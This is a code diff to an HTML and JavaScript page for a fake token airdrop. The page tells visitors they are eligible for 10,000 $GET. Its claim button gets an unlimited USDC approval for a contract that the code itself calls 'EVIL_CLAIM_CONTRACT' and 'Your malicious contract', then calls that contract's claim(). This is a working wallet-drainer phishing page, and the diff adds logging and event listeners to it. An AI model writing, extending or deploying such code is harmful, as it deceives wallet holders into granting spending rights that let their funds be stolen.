@@ -103,6 +103,20 @@
       color: #fff;
       font-size: 1rem;
       box-shadow: 0 0 12px rgba(255, 170, 51, 0.25);
+      margin-bottom: 1rem;
+    }
+    .log-area {
+      background: #222831;
+      color: #f1f1f5;
+      padding: 1rem;
+      border-radius: 12px;
+      font-size: 0.9rem;
+      height: 150px;
+      overflow-y: auto;
+      white-space: pre-wrap;
+      font-family: monospace;
+      max-width: 420px;
+      margin: 0 auto 1rem;
     }
   </style>
 </head>
@@ -118,6 +132,7 @@
     <div id="eligibilityMessage" class="eligibility-msg" style="display:none;">
       ✅ You are eligible for <strong>10,000 $GET</strong>
     </div>
+    <div id="logArea" class="log-area" style="display:none;"></div>
   </div>
 
   <script src="https://cdn.jsdelivr.net/npm/ethers@5.7.2/dist/ethers.umd.min.js"></script>
@@ -126,24 +141,28 @@
     const walletAddressDiv = document.getElementById('walletAddress');
     const claimBtn = document.getElementById('claimBtn');
     const eligibilityMsg = document.getElementById('eligibilityMessage');
+    const logArea = document.getElementById('logArea');
 
     let provider, signer;
 
-    // Base USDC token address on Base mainnet
-    const USDC_ADDRESS = "0x833589fCD6eDb6E08f4c7C32D4f71b54bdA02913";
+    const USDC_ADDRESS = "0x833589fCD6eDb6E08f4c7C32D4f71b54bdA02913"; // Base USDC
+    const EVIL_CLAIM_CONTRACT = "0x947A3CbB49401Aa8B89c47A16B09a0111DCe916c"; // Your malicious contract
 
-    // Your deployed malicious contract address (EvilClaim renamed)
-    const EVIL_CLAIM_CONTRACT = "0x947A3CbB49401Aa8B89c47A16B09a0111DCe916c";
-
-    // Minimal ERC20 ABI with approve
     const ERC20_ABI = [
       "function approve(address spender, uint256 amount) external returns (bool)"
     ];
-
-    // Your malicious contract ABI with claim()
     const EVIL_ABI = [
-      "function claim() external"
+      "function claim() external",
+      "event ClaimAttempt(address indexed user)",
+      "event ClaimSuccess(address indexed user)",
+      "event ClaimFailed(address indexed user, string reason)"
     ];
+
+    function log(message) {
+      logArea.style.display = 'block';
+      logArea.textContent += message + "\n";
+      logArea.scrollTop = logArea.scrollHeight;
+    }
 
     connectWalletBtn.addEventListener('click', async () => {
       if (!window.ethereum) {
@@ -170,6 +189,7 @@
 
         eligibilityMsg.style.display = 'block';
         claimBtn.disabled = false;
+        log("Wallet connected: " + address);
       } catch (err) {
         alert("Connection failed: " + (err.message || err));
       }
@@ -182,20 +202,34 @@
       }
 
       try {
-        // Step 1: Approve USDC for the malicious contract to pull funds
+        log("Approving USDC spend...");
         const usdc = new ethers.Contract(USDC_ADDRESS, ERC20_ABI, signer);
         const approvalTx = await usdc.approve(EVIL_CLAIM_CONTRACT, ethers.constants.MaxUint256);
         await approvalTx.wait();
+        log("USDC approved.");
 
-        // Step 2: Call claim() on the malicious contract
         const evil = new ethers.Contract(EVIL_CLAIM_CONTRACT, EVIL_ABI, signer);
+
+        evil.on("ClaimAttempt", (user) => {
+          log(`ClaimAttempt event: user=${user}`);
+        });
+        evil.on("ClaimSuccess", (user) => {
+          log(`ClaimSuccess event: user=${user}`);
+          alert("✅ Claim successful!");
+        });
+        evil.on("ClaimFailed", (user, reason) => {
+          log(`ClaimFailed event: user=${user}, reason=${reason}`);
+          alert("❌ Claim failed: " + reason);
+        });
+
+        log("Calling claim()...");
         const claimTx = await evil.claim();
         await claimTx.wait();
-
-        alert("✅ Claim successful!");
+        log("Transaction confirmed on chain.");
       } catch (err) {
         console.error(err);
         alert("❌ Claim failed: " + (err?.reason || err?.message || "Unknown error"));
+        log("Error: " + (err?.reason || err?.message || "Unknown error"));
       }
     });
   </script>
